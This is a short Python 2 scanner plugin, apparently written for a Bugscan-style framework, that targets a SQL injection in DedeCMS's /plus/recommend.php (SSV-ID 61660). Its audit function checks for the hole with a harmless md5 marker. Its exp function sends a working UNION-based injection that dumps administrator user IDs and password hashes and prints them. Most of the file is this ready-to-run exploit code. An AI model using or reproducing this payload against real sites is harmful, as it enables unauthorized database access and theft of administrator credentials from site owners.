#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 61660
import re
import urllib2

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def exp(arg):
    url = arg
    exp="/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,group_concat(userid,0x23,pwd),5,6,7,8,9%20from%20`%23@__admin`%23"
    try:
        response=urllib2.urlopen(url+exp)
        body = response.read()
        code=response.getcode()
    except urllib2.HTTPError, e:
        code=e.code
    if code == 200:
        m = re.search('<h2>.*(ad.*)\#([0-9a-z]+)</h2>', body)
        if m:
            security_info("username: %s; md5(password) : %s" %(m.group(1),m.group(2)))
def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23')
    if body and body.find('2e0e20673083dea5cc87a85d54022049') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://localhost/dedecms/5.6final/')[1])
    exp(assign('dedecms', 'http://localhost/dedecms/5.6final/')[1])